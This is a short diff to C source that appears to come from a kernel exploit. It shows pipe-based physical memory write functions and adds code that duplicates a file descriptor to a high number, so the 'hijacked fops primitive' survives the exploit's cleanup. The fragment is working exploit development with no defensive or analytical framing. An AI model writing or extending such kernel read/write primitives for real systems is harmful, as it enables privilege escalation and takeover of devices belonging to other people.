@@ -612,7 +612,13 @@ int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
   return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
 }
 
+int g_physrw_fd = -1;
+
 int install_pipe_physrw(int fd) {
+  /* dup to a high number: survives exploit cleanup closes; the dup
+   * shares the same struct file, hence the hijacked fops primitive */
+  int dup_fd = fcntl(fd, F_DUPFD, 2000);
+  g_physrw_fd = (dup_fd >= 0) ? dup_fd : fd;
   if (pipebuf_page_base == 0) {
     atomic_store(&pipe_prepare_done, 0);
     atomic_store(&pipe_prepare_request, 1);
